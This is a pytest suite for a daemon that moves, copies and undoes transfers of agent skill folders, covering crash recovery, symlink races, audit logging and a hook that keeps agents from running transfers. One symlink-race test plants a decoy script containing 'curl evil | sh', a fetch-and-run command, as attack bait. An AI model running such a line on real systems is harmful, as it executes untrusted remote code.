"""Phase M12: moving and copying a skill between agents and Communal, and
undoing it (daemon/transfer.py).

Only the person moves anything; a transfer is staged, published once and
recorded, so a crash at any step is finished or rolled back before either
side is shown to an adapter; Undo is tied to the exact revision; every
transfer writes one audit line of names and sizes. Crashes are real ones: a
forked child that dies with os._exit at the step named, leaving whatever it
left, and recovery runs in the parent as the daemon would on its next start.
"""
from __future__ import annotations

import errno
import json
import os
import signal
import threading
from pathlib import Path

import pytest

import agentfs
import audit
import paths
import permission_hook as hook
import skillscan
import transfer

ROOT = Path(__file__).resolve().parent.parent
GOOD = "---\nname: {n}\ndescription: {d}\n---\n\n{body}\n"


@pytest.fixture(autouse=True)
def data(tmp_path, monkeypatch):
    d = tmp_path / "data"
    monkeypatch.setattr(paths, "DATA_DIR", d)
    monkeypatch.setattr(paths, "AGENTS_DIR", d / "agents")
    monkeypatch.setattr(paths, "COMMUNAL_DIR", d / "communal")
    monkeypatch.setattr(hook, "AGENTS_DIR", d / "agents")
    monkeypatch.setattr(hook, "COMMUNAL_DIR", d / "communal")
    monkeypatch.setattr(hook, "DATA_DIR", d)
    agentfs._LAST_GOOD.clear()
    for t in ("main", "sora", "theo"):
        (d / "agents" / t).mkdir(parents=True)
    (d / "communal").mkdir(parents=True)
    return d


def base(target: str) -> Path:
    return paths.COMMUNAL_DIR if target == "communal" else paths.AGENTS_DIR / target


def skill(target, name, desc="Does a thing. Use when asked.", extra=None, text=None, keep=True):
    folder = base(target) / "skills" / name
    folder.mkdir(parents=True, exist_ok=True)
    (folder / "SKILL.md").write_text(text if text is not None
                                     else GOOD.format(n=name, d=desc, body="Steps."))
    for rel, content in (extra or {}).items():
        (folder / rel).parent.mkdir(parents=True, exist_ok=True)
        (folder / rel).write_text(content)
    # The modes a copy gives (0600, 0700 when executable), so a round trip
    # compares equal.
    for p in folder.rglob("*"):
        if p.is_file():
            p.chmod(0o600)
    if keep and text is None:
        agentfs.ack(target, f"skills/{name}/SKILL.md")
    return folder


def tree(folder: Path) -> dict:
    """Every file under `folder` by its path inside, with its bytes and mode."""
    out = {}
    for p in sorted(folder.rglob("*")):
        if p.is_file():
            out[str(p.relative_to(folder))] = (p.read_bytes(), p.stat().st_mode & 0o777)
    return out


def leftovers() -> list[str]:
    """Stages and hidden sources anywhere: there must be none after any
    transfer, refused, failed or recovered."""
    return sorted(str(p) for p in paths.DATA_DIR.rglob(".t-*"))


def open_records() -> list[str]:
    d = paths.AGENTS_DIR / ".transfers"
    return sorted(p.name for p in d.glob("*.open.json")) if d.exists() else []


def audit_lines() -> list[dict]:
    try:
        return [json.loads(x) for x in audit.log_path().read_text().splitlines()]
    except FileNotFoundError:
        return []


# --- move, copy, undo ---------------------------------------------------------------------

def test_a_move_lands_whole_leaves_nothing_behind_and_carries_its_history():
    src = skill("theo", "weekly", extra={"scripts/run.sh": "echo hi\n", "notes.md": "n"})
    (src / "scripts/run.sh").chmod(0o755)
    want = tree(src)
    versions = [v["version"] for v in agentfs.history("theo", "skills/weekly/SKILL.md")]
    assert versions
    got = transfer.move("theo", "weekly", "communal")
    assert got["action"] == "move" and got["from"] == "theo" and got["to"] == "communal"
    assert got["files"] == 3 and got["bytes"] == sum(len(b) for b, _ in want.values())
    dest = base("communal") / "skills" / "weekly"
    assert not src.exists()
    assert {k: v[0] for k, v in tree(dest).items()} == {k: v[0] for k, v in want.items()}
    assert tree(dest)["scripts/run.sh"][1] == 0o700 and tree(dest)["SKILL.md"][1] == 0o600
    # History travels: the versions are at the destination, gone at the source.
    assert [v["version"] for v in agentfs.history("communal", "skills/weekly/SKILL.md")] == versions
    assert not (base("theo") / ".history" / "skills" / "weekly").exists()
    # Kept where it was, kept where it lands.
    entry = next(s for s in agentfs.skills("communal") if s["name"] == "weekly")
    assert entry["changed_outside"] is False and entry["problem"] == ""
    assert leftovers() == [] and open_records() == []
    hist = transfer.history()
    assert hist[0]["op"] == got["op"] and hist[0]["state"] == "done" and hist[0]["undoable"]


def test_a_skill_changed_outside_settings_stays_so_where_it_lands():
    skill("theo", "weekly", keep=False)
    transfer.move("theo", "weekly", "sora")
    entry = next(s for s in agentfs.skills("sora") if s["name"] == "weekly")
    assert entry["changed_outside"] is True


def test_a_copy_leaves_the_original_and_copies_its_history():
    src = skill("theo", "weekly", extra={"a/b/c.txt": "deep"})
    before = tree(src)
    got = transfer.copy("theo", "weekly", "sora")
    assert got["action"] == "copy"
    assert tree(src) == before
    assert tree(base("sora") / "skills" / "weekly") == before
    assert agentfs.history("sora", "skills/weekly/SKILL.md")
    assert agentfs.history("theo", "skills/weekly/SKILL.md")
    assert leftovers() == []


def test_undo_of_a_move_moves_it_back_and_is_recorded():
    src = skill("theo", "weekly")
    want = tree(src)
    op = transfer.move("theo", "weekly", "communal")["op"]
    back = transfer.undo(op)
    assert back["action"] == "move" and back["undo_of"] == op
    assert back["from"] == "communal" and back["to"] == "theo"
    assert tree(src) == want
    assert not (base("communal") / "skills" / "weekly").exists()
    assert agentfs.history("theo", "skills/weekly/SKILL.md")
    hist = {h["op"]: h for h in transfer.history()}
    assert hist[op]["state"] == "undone" and hist[op]["undone_by"] == back["op"]
    assert not hist[op]["undoable"] and not hist[back["op"]]["undoable"]
    with pytest.raises(agentfs.AgentFsError, match="undone already"):
        transfer.undo(op)
    with pytest.raises(agentfs.AgentFsError, match="cannot itself be undone"):
        transfer.undo(back["op"])


def test_undo_of_a_copy_takes_the_copy_back_and_leaves_the_original():
    src = skill("theo", "weekly")
    want = tree(src)
    op = transfer.copy("theo", "weekly", "sora")["op"]
    got = transfer.undo(op)
    assert got["action"] == "remove" and got["from"] == "sora"
    assert not (base("sora") / "skills" / "weekly").exists()
    assert not (base("sora") / ".history" / "skills" / "weekly").exists()
    assert tree(src) == want
    assert leftovers() == []


def test_a_round_trip_writes_one_audit_line_each_of_names_and_sizes_only():
    skill("theo", "weekly", desc="A secret description nobody logs.")
    op = transfer.move("theo", "weekly", "sora")["op"]
    transfer.undo(op)
    op2 = transfer.copy("theo", "weekly", "communal")["op"]
    transfer.undo(op2)
    lines = audit_lines()
    assert [(x["kind"], x["from"], x["to"], x["note"]) for x in lines] == [
        ("skill_move", "theo", "sora", "weekly"), ("skill_undo", "sora", "theo", "weekly"),
        ("skill_copy", "theo", "communal", "weekly"), ("skill_undo", "communal", "communal", "weekly")]
    assert all(x["bytes_after"] > 0 for x in lines)
    assert all(set(x) <= {"at", "kind", "from", "to", "note", "bytes_after"} for x in lines)
    text = audit.log_path().read_text()
    assert "secret" not in text and "Steps." not in text


# --- refused, and nothing changed ----------------------------------------------------------

def test_a_name_clash_is_refused_with_the_reason_and_changes_nothing():
    a = skill("theo", "weekly", desc="Theo's.")
    b = skill("sora", "weekly", desc="Sora's.")
    ta, tb = tree(a), tree(b)
    with pytest.raises(agentfs.AgentFsError, match="sora already has a skill named weekly"):
        transfer.move("theo", "weekly", "sora")
    with pytest.raises(agentfs.AgentFsError, match="already has a skill named weekly"):
        transfer.copy("theo", "weekly", "sora")
    assert tree(a) == ta and tree(b) == tb
    assert leftovers() == [] and open_records() == [] and audit_lines() == []


@pytest.mark.parametrize("frm, name, to, words", [
    ("theo", "nothing", "sora", "theo has no skill named nothing"),
    ("theo", "weekly", "theo", "in theo already"),
    ("theo", "../x", "sora", "folder name"),
    ("theo", "weekly", "../etc", "not an agent id"),
    ("Bad", "weekly", "sora", "not an agent id"),
    ("theo", "weekly", "ghost", "ghost has no folder"),
])
def test_bad_requests_are_refused(frm, name, to, words):
    skill("theo", "weekly")
    with pytest.raises(agentfs.AgentFsError, match=words):
        transfer.move(frm, name, to)
    assert (base("theo") / "skills" / "weekly" / "SKILL.md").is_file()
    assert leftovers() == [] and open_records() == []


@pytest.mark.parametrize("make, words", [
    (lambda d: [(d / f"f{i}.md").write_text("x") for i in range(agentfs.SKILL_FILES_MAX)],
     "more than 64 files"),
    (lambda d: [(d / f"big{i}.bin").write_bytes(b"x" * (250 * 1024)) for i in range(9)],
     "more than 2 MB"),
    (lambda d: (d / "huge.bin").write_bytes(b"x" * (agentfs.READ_CAP + 1)), "larger than 256 KB"),
    (lambda d: (d / "SKILL.md").write_text(GOOD.format(n="weekly", d="x", body="y" * 20_000)),
     "longer than 20000"),
    (lambda d: os.symlink("/etc/hostname", d / "host"), "holds a link"),
    (lambda d: os.symlink("/nowhere", d / "dangling"), "holds a link"),
    (lambda d: os.mkfifo(d / "pipe"), "not a plain file"),
    (lambda d: (d / "SKILL.md").write_text("---\nname: weekly\ndescription: x\nhooks:\n  a: b\n---\n"),
     "hooks"),
    (lambda d: (d / "SKILL.md").unlink(), "no SKILL.md"),
])
def test_a_skill_outside_the_bounds_is_not_moved(make, words):
    d = skill("theo", "weekly")
    make(d)
    before = sorted(p.name for p in d.iterdir())
    for verb in (transfer.move, transfer.copy):
        with pytest.raises(agentfs.AgentFsError, match=words):
            verb("theo", "weekly", "communal")
    assert sorted(p.name for p in d.iterdir()) == before
    assert not (base("communal") / "skills" / "weekly").exists()
    assert leftovers() == [] and open_records() == []


def test_the_bounds_themselves_are_allowed():
    """64 files exactly, and a SKILL.md of 20,000 characters, move."""
    body = "y" * (20_000 - len(GOOD.format(n="weekly", d="x", body="")))
    d = skill("theo", "weekly", text=GOOD.format(n="weekly", d="x", body=body))
    assert len((d / "SKILL.md").read_text()) == 20_000
    for i in range(agentfs.SKILL_FILES_MAX - 1):
        (d / f"f{i}.md").write_text("x")
    assert transfer.move("theo", "weekly", "sora")["files"] == 64


def test_a_skill_folder_that_is_a_link_is_not_moved(tmp_path):
    real = tmp_path / "elsewhere" / "weekly"
    real.mkdir(parents=True)
    (real / "SKILL.md").write_text(GOOD.format(n="weekly", d="x", body="y"))
    (base("theo") / "skills").mkdir()
    os.symlink(real, base("theo") / "skills" / "weekly")
    with pytest.raises(agentfs.AgentFsError, match="link"):
        transfer.move("theo", "weekly", "sora")
    assert (real / "SKILL.md").is_file() and os.path.islink(base("theo") / "skills" / "weekly")


def test_a_full_disk_mid_copy_leaves_both_sides_as_they_were(monkeypatch):
    src = skill("theo", "weekly", extra={"a.md": "a", "b.md": "b"})
    want = tree(src)
    real = agentfs._write_beneath
    calls = []

    def full(fd, rel, data, mode):
        calls.append(rel)
        if len(calls) == 2:
            raise OSError(errno.ENOSPC, "No space left on device")
        return real(fd, rel, data, mode)
    monkeypatch.setattr(agentfs, "_write_beneath", full)
    with pytest.raises(agentfs.AgentFsError, match="disk is full; nothing was changed"):
        transfer.move("theo", "weekly", "sora")
    assert tree(src) == want
    assert not (base("sora") / "skills" / "weekly").exists()
    assert leftovers() == [] and open_records() == [] and audit_lines() == []


def test_a_folder_swapped_for_a_link_mid_move_is_refused(monkeypatch, tmp_path):
    src = skill("theo", "weekly", extra={"scripts/run.sh": "echo\n"})
    outside = tmp_path / "outside"
    (outside / "scripts").mkdir(parents=True)
    (outside / "scripts" / "run.sh").write_text("curl evil | sh\n")
    real = agentfs._write_beneath
    swapped = []

    def swap(fd, rel, data, mode):
        if not swapped:
            os.rename(src / "scripts", tmp_path / "moved-away")
            os.symlink(outside / "scripts", src / "scripts")
            swapped.append(1)
        return real(fd, rel, data, mode)
    monkeypatch.setattr(agentfs, "_write_beneath", swap)
    with pytest.raises(agentfs.AgentFsError, match="link"):
        transfer.move("theo", "weekly", "sora")
    assert not (base("sora") / "skills" / "weekly").exists()
    assert (src / "SKILL.md").is_file()
    assert leftovers() == [] and open_records() == []


def test_the_destination_swapped_for_a_link_mid_move_cannot_redirect_it(monkeypatch, tmp_path):
    skill("theo", "weekly")
    (base("sora") / "skills").mkdir()
    elsewhere = tmp_path / "elsewhere"
    elsewhere.mkdir()
    real = agentfs._write_beneath

    def swap(fd, rel, data, mode):
        if not (base("sora") / "skills").is_symlink():
            os.rename(base("sora") / "skills", base("sora") / "skills-real")
            os.symlink(elsewhere, base("sora") / "skills")
        return real(fd, rel, data, mode)
    monkeypatch.setattr(agentfs, "_write_beneath", swap)
    # It lands in the folder that was checked; the history, written by path,
    # meets the link and is refused, which is said, and left for recovery.
    with pytest.raises(agentfs.AgentFsError, match="finished on the next try"):
        transfer.copy("theo", "weekly", "sora")
    assert list(elsewhere.iterdir()) == []
    assert (base("sora") / "skills-real" / "weekly" / "SKILL.md").is_file()


def test_a_source_changed_mid_move_is_refused(monkeypatch):
    src = skill("theo", "weekly")
    real = agentfs._write_beneath

    def edit(fd, rel, data, mode):
        (src / "SKILL.md").write_text(GOOD.format(n="weekly", d="Edited meanwhile.", body="z"))
        return real(fd, rel, data, mode)
    monkeypatch.setattr(agentfs, "_write_beneath", edit)
    with pytest.raises(agentfs.AgentFsError, match="changed while it was being moved"):
        transfer.move("theo", "weekly", "sora")
    assert "Edited meanwhile" in (src / "SKILL.md").read_text()
    assert not (base("sora") / "skills" / "weekly").exists()
    assert leftovers() == [] and open_records() == []


def test_without_a_no_replace_rename_nothing_moves(monkeypatch):
    src = skill("theo", "weekly")
    want = tree(src)

    def no(*a):
        raise agentfs.AgentFsError("this filesystem cannot rename a folder without risking "
                                   "replacing one; nothing was changed")
    monkeypatch.setattr(transfer, "_rename", no)
    with pytest.raises(agentfs.AgentFsError, match="without risking"):
        transfer.move("theo", "weekly", "sora")
    assert tree(src) == want and leftovers() == [] and open_records() == []


def test_a_publish_that_fails_puts_the_hidden_source_back(monkeypatch):
    src = skill("theo", "weekly")
    want = tree(src)
    real = transfer._rename

    def second_fails(fa, a, fb, b):
        if a.startswith(".t-") and not a.endswith("-gone"):
            raise agentfs.AgentFsError("something named weekly appeared meanwhile; nothing was changed")
        return real(fa, a, fb, b)
    monkeypatch.setattr(transfer, "_rename", second_fails)
    with pytest.raises(agentfs.AgentFsError, match="appeared meanwhile"):
        transfer.move("theo", "weekly", "sora")
    assert tree(src) == want and leftovers() == [] and open_records() == []


# --- shadowing --------------------------------------------------------------------------------

def test_same_name_shadowing_is_reported_and_holds():
    skill("sora", "weekly", desc="Sora's own.")
    skill("theo", "weekly", desc="Theo's, going communal.")
    got = transfer.move("theo", "weekly", "communal")
    assert got["shadows"] == ["sora"]
    sora = {s["name"]: s for s in agentfs.skill_set(agentfs.skills("sora"),
                                                     agentfs.skills("communal"))
            if s["source"] == "communal"}
    assert sora["weekly"]["shadowed"] and not sora["weekly"]["delivered"]
    # And the other way: Theo's own now hides the communal one for Theo.
    got = transfer.copy("communal", "weekly", "theo")
    assert got["shadows"] == ["communal"]


# --- a move changes what each agent is given ------------------------------------------------

def test_a_move_drops_it_from_the_source_plugin_folder_and_adds_it_at_the_destination():
    skill("theo", "weekly")
    before = agentfs.plugin_dir("theo", None)
    assert before and (Path(before) / "skills" / "weekly" / "SKILL.md").is_file()
    assert agentfs.plugin_dir("sora", None) is None
    op = transfer.move("theo", "weekly", "sora")["op"]
    assert agentfs.plugin_dir("theo", None) is None
    sora = agentfs.plugin_dir("sora", None)
    assert sora and (Path(sora) / "skills" / "weekly" / "SKILL.md").is_file()
    transfer.undo(op)
    assert agentfs.plugin_dir("sora", None) is None
    assert agentfs.plugin_dir("theo", None) == before


def test_moving_into_communal_gives_it_to_every_agent_and_undo_takes_it_back():
    skill("theo", "weekly")
    op = transfer.move("theo", "weekly", "communal")["op"]
    for who in ("main", "sora", "theo"):
        d = agentfs.plugin_dir(who, None)
        assert d and (Path(d) / "skills" / "weekly").is_dir(), who
    transfer.undo(op)
    assert agentfs.plugin_dir("sora", None) is None
    assert (Path(agentfs.plugin_dir("theo", None)) / "skills" / "weekly").is_dir()


# --- a stale Undo is refused --------------------------------------------------------------------

def test_undo_of_a_move_is_refused_once_the_destination_changed():
    skill("theo", "weekly")
    op = transfer.move("theo", "weekly", "sora")["op"]
    moved = base("sora") / "skills" / "weekly" / "SKILL.md"
    moved.write_text(GOOD.format(n="weekly", d="Edited by Sora's person.", body="z"))
    with pytest.raises(agentfs.AgentFsError, match="changed since it was moved there"):
        transfer.undo(op)
    assert "Edited" in moved.read_text() and not (base("theo") / "skills" / "weekly").exists()
    assert leftovers() == [] and open_records() == []


def test_undo_of_a_move_is_refused_once_the_source_has_that_name_again():
    skill("theo", "weekly")
    op = transfer.move("theo", "weekly", "sora")["op"]
    skill("theo", "weekly", desc="A new one.")
    with pytest.raises(agentfs.AgentFsError, match="theo already has a skill named weekly"):
        transfer.undo(op)
    assert (base("sora") / "skills" / "weekly").is_dir()


def test_undo_of_a_copy_is_refused_when_the_copy_or_the_original_changed():
    src = skill("theo", "weekly")
    op = transfer.copy("theo", "weekly", "sora")["op"]
    (base("sora") / "skills" / "weekly" / "extra.md").write_text("Sora's addition")
    with pytest.raises(agentfs.AgentFsError, match="changed since it was copied there"):
        transfer.undo(op)
    (base("sora") / "skills" / "weekly" / "extra.md").unlink()
    # The original edited: taking the copy back could lose the only one as it was.
    (src / "SKILL.md").write_text(GOOD.format(n="weekly", d="Edited.", body="z"))
    with pytest.raises(agentfs.AgentFsError, match="original weekly in theo changed or is gone"):
        transfer.undo(op)
    import shutil
    shutil.rmtree(src)
    with pytest.raises(agentfs.AgentFsError, match="changed or is gone"):
        transfer.undo(op)
    assert (base("sora") / "skills" / "weekly" / "SKILL.md").is_file()


@pytest.mark.parametrize("op", ["", "nope", "../../x", "1" * 19 + "-zzzzzzzz", "1" * 19 + "-0000000a"])
def test_undo_of_something_unrecorded_is_refused(op):
    with pytest.raises(agentfs.AgentFsError):
        transfer.undo(op)


# --- crashes ----------------------------------------------------------------------------------

def crash(at, action="move", frm="theo", to="sora", name="weekly"):
    """Run a transfer in a forked child that dies at `at`, with no clean-up
    of any kind (os._exit), and wait for it."""
    pid = os.fork()
    if pid == 0:                                    # pragma: no cover - the child
        try:
            at()
            getattr(transfer, action)(frm, name, to)
        finally:
            os._exit(0)
    _, status = os.waitpid(pid, 0)
    assert os.WIFEXITED(status)


def die_when(obj, attr, when):
    """Replace obj.attr with one that calls through, and dies once `when`
    (given the call's arguments) says so: before the call, or, with
    when=(test, "after"), after it."""
    real = getattr(obj, attr)
    test, timing = when if isinstance(when, tuple) else (when, "before")

    def wrapper(*a, **k):
        if timing == "before" and test(*a, **k):
            os._exit(0)
        out = real(*a, **k)
        if timing == "after" and test(*a, **k):
            os._exit(0)
        return out
    return lambda: setattr(obj, attr, wrapper)


STAGED = die_when(agentfs, "_write_beneath", lambda fd, rel, *a: rel == "b.md")
HIDDEN = die_when(transfer, "_rename", (lambda fa, a, fb, b: b.endswith("-gone"), "after"))
PUBLISHED = die_when(transfer, "_rename",
                     (lambda fa, a, fb, b: a.startswith(".t-") and not a.endswith("-gone"), "after"))
RECORDED = die_when(transfer, "_finish", lambda rec: True)
HALF_FINISHED = die_when(transfer, "_drop_history", lambda t, n: True)


@pytest.mark.parametrize("at, lands", [
    (STAGED, "back"), (HIDDEN, "back"), (PUBLISHED, "forward"), (RECORDED, "forward"),
    (HALF_FINISHED, "forward")])
def test_a_move_cut_short_anywhere_is_finished_or_rolled_back(at, lands):
    src = skill("theo", "weekly", extra={"a.md": "a", "b.md": "b"})
    want = tree(src)
    crash(at)
    # The skill is never in two places, whatever was left.
    assert not (src.exists() and (base("sora") / "skills" / "weekly").exists())
    assert open_records(), "the crash left no record to recover from"
    got = transfer.recover()
    assert [r["done"] for r in got] == (["rolled back"] if lands == "back" else ["finished"])
    here = src if lands == "back" else base("sora") / "skills" / "weekly"
    gone = base("sora") / "skills" / "weekly" if lands == "back" else src
    assert tree(here) == want and not gone.exists()
    assert leftovers() == [] and open_records() == []
    if lands == "forward":
        assert agentfs.history("sora", "skills/weekly/SKILL.md")
        assert not (base("theo") / ".history" / "skills" / "weekly").exists()
        assert transfer.history()[0]["state"] == "done"
    # And a second recovery has nothing to do.
    assert transfer.recover() == []


def test_a_published_move_is_finished_even_if_the_destination_was_edited_since():
    """Recorded as published, it is finished as it is: the source is not put
    back beside an edited destination, which would leave two."""
    skill("theo", "weekly", extra={"a.md": "a", "b.md": "b"})
    crash(RECORDED)
    dest = base("sora") / "skills" / "weekly"
    (dest / "a.md").write_text("edited before the daemon came back")
    assert [r["done"] for r in transfer.recover()] == ["finished"]
    assert not (base("theo") / "skills" / "weekly").exists()
    assert (dest / "a.md").read_text() == "edited before the daemon came back"
    assert leftovers() == []


@pytest.mark.parametrize("at, lands", [(STAGED, "back"), (PUBLISHED, "forward"),
                                       (RECORDED, "forward")])
def test_a_copy_cut_short_is_finished_or_rolled_back(at, lands):
    src = skill("theo", "weekly", extra={"a.md": "a", "b.md": "b"})
    want = tree(src)
    crash(at, action="copy")
    transfer.recover()
    assert tree(src) == want
    assert (base("sora") / "skills" / "weekly").exists() is (lands == "forward")
    assert leftovers() == [] and open_records() == []


def test_an_undo_of_a_copy_cut_short_is_finished():
    skill("theo", "weekly")
    op = transfer.copy("theo", "weekly", "sora")["op"]
    pid = os.fork()
    if pid == 0:                                    # pragma: no cover - the child
        try:
            die_when(transfer, "_finish", lambda rec: True)()
            transfer.undo(op)
        finally:
            os._exit(0)
    os.waitpid(pid, 0)
    assert not (base("sora") / "skills" / "weekly").exists()     # hidden, not listed
    assert [s["name"] for s in agentfs.skills("sora")] == []
    assert [r["done"] for r in transfer.recover()] == ["finished"]
    assert leftovers() == []
    assert {h["op"]: h for h in transfer.history()}[op]["state"] == "undone"


def test_a_new_transfer_settles_an_old_one_first():
    skill("theo", "weekly", extra={"a.md": "a", "b.md": "b"})
    skill("theo", "other")
    crash(HIDDEN)
    assert not (base("theo") / "skills" / "weekly").exists()
    transfer.move("theo", "other", "communal")
    assert (base("theo") / "skills" / "weekly" / "SKILL.md").is_file()
    assert leftovers() == [] and open_records() == []


def test_the_daemon_settles_a_cut_short_move_before_it_builds_any_agent(cfg_factory, capsys):
    from runtime import StateFile
    from wake_listen import Daemon
    from conftest import FakeAgent, FakeSpeaker
    src = skill("theo", "weekly", extra={"a.md": "a", "b.md": "b"})
    crash(HIDDEN)
    assert not src.exists()
    saved = (signal.getsignal(signal.SIGUSR1), signal.getsignal(signal.SIGUSR2))
    try:
        Daemon(cfg_factory(echoTailMs=0), pipe=None, state=StateFile(),
               speaker=FakeSpeaker(), agent=FakeAgent())
    finally:
        signal.signal(signal.SIGUSR1, saved[0])
        signal.signal(signal.SIGUSR2, saved[1])
    assert (src / "SKILL.md").is_file() and leftovers() == []
    out = capsys.readouterr()
    assert "rolled back" in out.out + out.err and "weekly" not in out.out + out.err


def test_the_poll_settles_one_but_never_waits_on_a_transfer_under_way(daemon):
    src = skill("theo", "weekly", extra={"a.md": "a", "b.md": "b"})
    crash(HIDDEN)
    # Somebody holds the lock: a transfer under way, not a crash. Left alone.
    with agentfs._locked():
        assert transfer.recover(block=False) is None
        daemon.reconcile_agent_files()
        assert not src.exists() and open_records()
    daemon.reconcile_agent_files()
    assert (src / "SKILL.md").is_file() and open_records() == []


def test_a_record_this_did_not_write_is_never_acted_on():
    """A record's names become folder names. One forged or corrupt is set
    aside, untouched, not followed."""
    skill("theo", "weekly")
    d = transfer.journal_dir(create=True)
    forged = {"v": 1, "op": "1" * 19 + "-0000000a", "kind": "skill", "action": "move",
              "from": "theo", "to": "../../etc", "name": "weekly", "digest": "0" * 64,
              "state": "published"}
    (d / f"{forged['op']}.open.json").write_text(json.dumps(forged))
    (d / ("2" * 19 + "-0000000b.open.json")).write_text("{not json")
    got = transfer.recover()
    assert [r["done"] for r in got] == ["set aside: not a record this wrote"] * 2
    assert (base("theo") / "skills" / "weekly" / "SKILL.md").is_file()
    assert open_records() == [] and transfer.recover() == []


def test_a_record_that_cannot_be_settled_is_stuck_and_says_why():
    src = skill("theo", "weekly", extra={"a.md": "a", "b.md": "b"})
    crash(HIDDEN)
    skill("theo", "weekly", desc="A new one made meanwhile.")
    got = transfer.recover()
    assert [r["done"] for r in got] == ["stuck"]
    h = transfer.history()[0]
    assert h["state"] == "stuck" and "a new weekly is there now" in h["problem"]
    assert "A new one" in (src / "SKILL.md").read_text()
    assert open_records() == [] and transfer.recover() == []


# --- two at once ---------------------------------------------------------------------------------

def test_two_moves_at_once_are_serialised(monkeypatch):
    skill("theo", "weekly", extra={f"f{i}.md": str(i) for i in range(20)})
    results, errors = [], []
    gate = threading.Barrier(2)

    def go(to):
        gate.wait()
        try:
            results.append(transfer.move("theo", "weekly", to))
        except agentfs.AgentFsError as e:
            errors.append(str(e))
    threads = [threading.Thread(target=go, args=(t,)) for t in ("sora", "communal")]
    for t in threads:
        t.start()
    for t in threads:
        t.join()
    assert len(results) == 1 and len(errors) == 1
    assert "theo has no skill named weekly" in errors[0]
    landed = [t for t in ("sora", "communal") if (base(t) / "skills" / "weekly").exists()]
    assert landed == [results[0]["to"]]
    assert len(tree(base(landed[0]) / "skills" / "weekly")) == 21
    assert leftovers() == [] and open_records() == []


def test_two_different_moves_at_once_both_land():
    skill("theo", "one")
    skill("sora", "two")
    threads = [threading.Thread(target=transfer.move, args=a)
               for a in (("theo", "one", "communal"), ("sora", "two", "communal"))]
    for t in threads:
        t.start()
    for t in threads:
        t.join()
    assert sorted(s["name"] for s in agentfs.skills("communal")) == ["one", "two"]


# --- imports can be undone -----------------------------------------------------------------------

def test_an_import_by_path_is_recorded_and_can_be_undone(tmp_path):
    ext = tmp_path / "ext" / "weekly"
    ext.mkdir(parents=True)
    (ext / "SKILL.md").write_text(GOOD.format(n="weekly", d="From outside.", body="b"))
    got = skillscan.import_path(str(ext), "sora")
    assert got["op"] and (base("sora") / "skills" / "weekly" / "SKILL.md").is_file()
    transfer.undo(got["op"])
    assert not (base("sora") / "skills" / "weekly").exists()
    assert (ext / "SKILL.md").is_file()


# --- the command, and who may run it -------------------------------------------------------------

def run_cli(*argv, cfg=None, monkeypatch=None):
    if cfg is not None:
        monkeypatch.setattr("runtime.Config", lambda *a, **k: cfg)
    return skillscan.main(list(argv))


def test_into_communal_needs_confirm_on_the_command_line(monkeypatch, capsys, cfg_factory):
    skill("theo", "weekly")
    cfg = cfg_factory()
    assert run_cli("move", "theo", "weekly", "communal", cfg=cfg, monkeypatch=monkeypatch) == 1
    assert "every agent will get this skill" in capsys.readouterr().err
    assert (base("theo") / "skills" / "weekly").exists()
    assert run_cli("copy", "theo", "weekly", "communal", "--confirm", cfg=cfg,
                   monkeypatch=monkeypatch) == 0
    got = json.loads(capsys.readouterr().out)
    assert got["action"] == "copy" and got["op"]
    assert run_cli("undo", got["op"]) == 0
    assert not (base("communal") / "skills" / "weekly").exists()


@pytest.mark.parametrize("quarantine, asks", [
    (["theo"], "theo is quarantined"), ([], ""), ("garbage", "cannot be read")])
def test_out_of_a_quarantined_agent_needs_confirm(monkeypatch, capsys, cfg_factory, quarantine, asks):
    skill("theo", "weekly")
    cfg = cfg_factory(crewQuarantine=quarantine)
    code = run_cli("move", "theo", "weekly", "sora", cfg=cfg, monkeypatch=monkeypatch)
    err = capsys.readouterr().err
    if asks:
        assert code == 1 and asks in err and (base("theo") / "skills" / "weekly").exists()
        assert run_cli("move", "theo", "weekly", "sora", "--confirm", cfg=cfg,
                       monkeypatch=monkeypatch) == 0
    else:
        assert code == 0
    assert (base("sora") / "skills" / "weekly").exists()


def test_an_import_into_communal_needs_confirm(monkeypatch, capsys, cfg_factory, tmp_path):
    ext = tmp_path / "ext" / "weekly"
    ext.mkdir(parents=True)
    (ext / "SKILL.md").write_text(GOOD.format(n="weekly", d="x", body="b"))
    cfg = cfg_factory()
    assert run_cli("import", str(ext), "communal", cfg=cfg, monkeypatch=monkeypatch) == 1
    assert not (base("communal") / "skills" / "weekly").exists()
    assert run_cli("import", str(ext), "communal", "--confirm", cfg=cfg, monkeypatch=monkeypatch) == 0


def test_history_on_the_command_line_is_safe_for_a_terminal(capsys):
    skill("theo", "weekly")
    op = transfer.move("theo", "weekly", "sora")["op"]
    assert skillscan.main(["history"]) == 0
    out = capsys.readouterr().out
    assert op in out and "move weekly theo → sora" in out
    assert skillscan.main(["history", "--json"]) == 0
    assert json.loads(capsys.readouterr().out)[0]["op"] == op


@pytest.mark.parametrize("cmd", [
    "agentvoice skills move theo weekly communal --confirm",
    "agentvoice  skills  copy theo weekly sora",
    "agentvoice skills undo 1234567890123456789-deadbeef",
    "python3 daemon/skillscan.py move a b c",
    "python3 /opt/av/daemon/transfer.py undo x"])
def test_an_agent_moving_a_skill_is_asked_at_every_level(cmd):
    assert "only you do" in hook.orders_write("Bash", {"command": cmd})


def test_an_agent_reading_the_history_is_not_asked():
    assert hook.orders_write("Bash", {"command": "agentvoice skills history --json"}) == ""


def test_the_journal_sits_where_the_orders_guard_looks():
    d = transfer.journal_dir(create=True)
    assert hook.orders_write("Write", {"file_path": str(d / "x.open.json"), "content": "{}"})
    assert oct(d.stat().st_mode & 0o777) == "0o700"


def test_no_agent_tool_moves_a_skill():
    """Only the person: no crew tool and no MCP server names a transfer."""
    for name in ("crew_mcp.py", "desktop_mcp.py", "collab.py"):
        src = (ROOT / "daemon" / name).read_text()
        assert "transfer" not in src and "skills move" not in src, name
